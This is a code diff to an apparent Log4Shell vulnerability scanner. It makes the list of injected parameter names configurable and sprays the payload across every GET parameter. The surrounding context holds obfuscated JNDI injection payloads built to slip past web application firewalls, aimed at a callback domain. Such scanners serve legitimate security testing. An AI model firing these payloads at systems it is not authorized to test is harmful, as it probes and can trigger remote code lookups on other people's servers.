@@ -86,7 +86,6 @@ default_headers = {
     # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
     'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
 }
-post_data_parameters = ["username", "user", "email", "email_address", "password"]
 waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_domain}}/{{random}}}",
                        "${${::-j}ndi:rmi://{{callback_domain}}/{{random}}}",
                        "${jndi:rmi://{{callback_domain}}}",
@@ -161,9 +160,17 @@ parser.add_argument("--dns-logs-path",
                     help="DNS logs path [Default: /data/dns.log].",
                     default="/data/dns.log",
                     action='store')
+parser.add_argument("--parameter-names",
+                    dest="parameter_names",
+                    help="Comma separated additional parameter names.",
+                    action='store')
 
 args = parser.parse_args()
 
+parameter_names = ["username", "user", "email", "email_address", "password"]
+
+if args.parameter_names:
+    parameter_names += args.parameter_names.split(",")
 
 def get_fuzzing_headers():
     fuzzing_headers = []
@@ -186,7 +193,7 @@ def gen_fuzzing_header(header, payload):
 
 def get_fuzzing_post_data(payload):
     fuzzing_post_data = {}
-    for i in post_data_parameters:
+    for i in parameter_names:
         fuzzing_post_data.update({i: payload})
     return fuzzing_post_data
 
@@ -248,7 +255,7 @@ def scan_url(url, callback_domain, proxies, timeout):
                 try:
                     requests.request(url=resp_get.url,
                                      method="GET",
-                                     params={"v": payload},
+                                     params={name: payload for name in parameter_names},
                                      headers={**default_headers, fuzzing_header: gen_fuzzing_header(fuzzing_header, payload)},
                                      verify=False,
                                      timeout=timeout,
